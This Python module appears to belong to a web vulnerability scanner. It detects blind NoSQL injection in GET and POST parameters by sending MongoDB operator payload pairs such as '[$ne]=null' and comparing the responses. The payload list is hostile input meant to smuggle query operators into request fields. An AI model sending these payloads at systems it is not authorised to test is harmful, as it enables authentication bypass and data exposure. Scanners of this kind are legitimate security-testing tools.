"""
Boolean-based blind NoSQL injection detection (MongoDB-style operator
injection, e.g. `?user[$ne]=null`). Mirrors boolean_blind's true/false
comparison approach but with NoSQL operator payloads instead of SQL.
"""

from core.http_client import inject_value
from core import logger

NOSQLI_PAYLOAD_PAIRS = [
    ("[$ne]=null", "[$eq]=__anka_impossible_value__"),
    ("[$gt]=", "[$lt]="),
    ("' || '1'=='1", "' || '1'=='2"),
]


def _fetch(client, point, param_suffix, value=""):
    params = dict(point.get("params", {}))
    base_name = point["name"]
    key = f"{base_name}{param_suffix}" if param_suffix.startswith("[") else base_name
    injected_value = value if param_suffix.startswith("[") else param_suffix
    params.pop(base_name, None)
    params[key] = injected_value
    if point["location"] == "GET":
        return client.send("GET", point["base_url"], params=params)
    if point["location"] == "POST":
        return client.send("POST", point["base_url"], data=params)
    return None, None


def detect(client, point, tamper_chain=None) -> dict:
    if point["location"] not in ("GET", "POST"):
        return {"vulnerable": False, "technique": "nosql-injection", "param": point["name"]}
    logger.info(f"[NoSQLi] testing param '{point['name']}' ({point['location']})")
    for true_suffix, false_suffix in NOSQLI_PAYLOAD_PAIRS:
        resp_true, _ = _fetch(client, point, true_suffix)
        resp_false, _ = _fetch(client, point, false_suffix)
        if resp_true is None or resp_false is None:
            continue
        if resp_true.status_code == resp_false.status_code and resp_true.text != resp_false.text:
            logger.payload(f"NoSQLi divergence with operator payload '{true_suffix}' vs '{false_suffix}'")
            return {
                "vulnerable": True,
                "technique": "nosql-injection",
                "param": point["name"],
                "location": point["location"],
                "evidence": {"true_payload": true_suffix, "false_payload": false_suffix},
            }
    return {"vulnerable": False, "technique": "nosql-injection", "param": point["name"]}
